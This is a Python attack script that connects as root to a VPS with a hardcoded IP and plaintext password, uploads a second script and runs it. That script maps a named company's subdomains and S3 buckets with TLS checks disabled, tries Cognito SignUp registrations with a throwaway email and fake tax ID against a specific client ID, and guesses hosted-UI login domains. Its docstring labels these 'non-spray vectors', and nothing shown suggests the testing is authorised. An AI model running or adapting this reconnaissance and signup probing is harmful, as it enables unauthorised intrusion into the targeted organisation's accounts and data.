"""Non-spray vectors from VPS: DNS weaker envs + Cognito SignUp + hosted UI + S3."""
import paramiko

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = r'''
import socket, json, urllib.request, ssl, urllib.error

ctx = ssl._create_unverified_context()
hosts = [
    "api.dev.disperso.com","app.dev.disperso.com","dev.disperso.com",
    "api.qa.disperso.com","app.qa.disperso.com","qa.disperso.com",
    "api.shd.disperso.com","app.shd.disperso.com","shd.disperso.com",
    "sandbox.disperso.com","staging.disperso.com","admin.disperso.com",
    "docs.disperso.com","cdn.disperso.com",
    "disperso-prod.s3.amazonaws.com","disperso-dev.s3.amazonaws.com",
    "disperso-uploads.s3.amazonaws.com","disperso-documents.s3.us-east-2.amazonaws.com",
]
print("=== DNS ===")
live = []
for h in hosts:
    try:
        ips = socket.getaddrinfo(h, 443, proto=socket.IPPROTO_TCP)
        addrs = sorted({x[4][0] for x in ips})
        print(f"  LIVE {h} -> {addrs}")
        live.append((h, addrs))
    except Exception as e:
        print(f"  NX  {h}")

print("\\n=== HTTP HEAD live ===")
for h, _ in live:
    for scheme in ("https", "http"):
        try:
            req = urllib.request.Request(f"{scheme}://{h}/", method="HEAD")
            req.add_header("User-Agent","Mozilla/5.0")
            r = urllib.request.urlopen(req, timeout=12, context=ctx)
            print(f"  {scheme} {h} -> {r.status} {r.headers.get('server','')} {r.headers.get('x-amz-bucket-region','')}")
        except urllib.error.HTTPError as e:
            print(f"  {scheme} {h} -> HTTP {e.code} {e.headers.get('server','')} {e.headers.get('x-amz-bucket-region','')}")
        except Exception as e:
            print(f"  {scheme} {h} -> {type(e).__name__} {e}")

print("\\n=== Cognito SignUp (register, not spray) ===")
import urllib.request
payloads = [
    {"ClientId":"4fjbm9cornhgfqk4o8m33rjt2f","Username":"probe.reg@yopmail.com","Password":"RegDisp2026!","UserAttributes":[{"Name":"email","Value":"probe.reg@yopmail.com"}]},
    {"ClientId":"4fjbm9cornhgfqk4o8m33rjt2f","Username":"probe.reg@yopmail.com","Password":"RegDisp2026!","UserAttributes":[{"Name":"email","Value":"probe.reg@yopmail.com"},{"Name":"custom:taxId","Value":"12345678-9"},{"Name":"custom:country","Value":"CHL"}]},
]
for i, body in enumerate(payloads):
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://cognito-idp.us-east-2.amazonaws.com/", data=data, method="POST")
    req.add_header("Content-Type","application/x-amz-json-1.1")
    req.add_header("X-Amz-Target","AWSCognitoIdentityProviderService.SignUp")
    try:
        r = urllib.request.urlopen(req, timeout=20, context=ctx)
        print(f"  SignUp#{i} -> {r.status} {r.read()[:400]}")
    except urllib.error.HTTPError as e:
        print(f"  SignUp#{i} -> {e.code} {e.read()[:400]}")
    except Exception as e:
        print(f"  SignUp#{i} -> {e}")

print("\\n=== Cognito Hosted UI guess ===")
for prefix in ["disperso","disperso-prod","disperso-app","socieix2s","tuxpan"]:
    h = f"{prefix}.auth.us-east-2.amazoncognito.com"
    try:
        socket.getaddrinfo(h, 443)
        req = urllib.request.Request(f"https://{h}/login?client_id=4fjbm9cornhgfqk4o8m33rjt2f&response_type=code&redirect_uri=https://app.disperso.com", method="GET")
        r = urllib.request.urlopen(req, timeout=12, context=ctx)
        print(f"  HOSTED {h} -> {r.status} {len(r.read())}")
    except urllib.error.HTTPError as e:
        print(f"  HOSTED {h} -> HTTP {e.code}")
    except Exception as e:
        print(f"  HOSTED {h} -> {type(e).__name__}")
'''

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
print(f"Connected {VPS}")
sftp = ssh.open_sftp()
with sftp.file("/tmp/nonspray.py", "w") as f:
    f.write(REMOTE)
sftp.close()
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/nonspray.py 2>&1", timeout=90)
print(stdout.read().decode(errors="replace"))
err = stderr.read().decode(errors="replace")
if err:
    print("STDERR", err)
ssh.close()
